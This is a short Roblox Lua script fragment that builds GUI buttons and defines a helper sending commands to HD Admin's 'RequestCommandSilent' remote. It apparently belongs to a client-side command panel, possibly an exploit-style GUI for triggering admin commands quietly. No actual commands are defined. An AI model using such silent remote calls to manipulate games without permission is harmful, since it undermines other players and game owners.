local CollectionService = game:GetService("CollectionService");
local G2L = {};


function hd(cmd)
game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(";".. cmd)
end

function newbutton(name,text,code)
G2L[name] = Instance.new("TextButton", G2L["ScrollingFrame_3"]);
G2L[name]["TextWrapped"] = true;
G2L[name]["BorderSizePixel"] = 0;
G2L[name]["TextSize"] = 10;
G2L[name]["TextScaled"] = true;
G2L[name]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L[name]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L[name]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L[name]["BackgroundTransparency"] = 0.3;
G2L[name]["Size"] = UDim2.new(0, 92, 0, 70);
G2L[name]["Text"] = text;
G2L[name].MouseButton1Click:Connect(code)
end







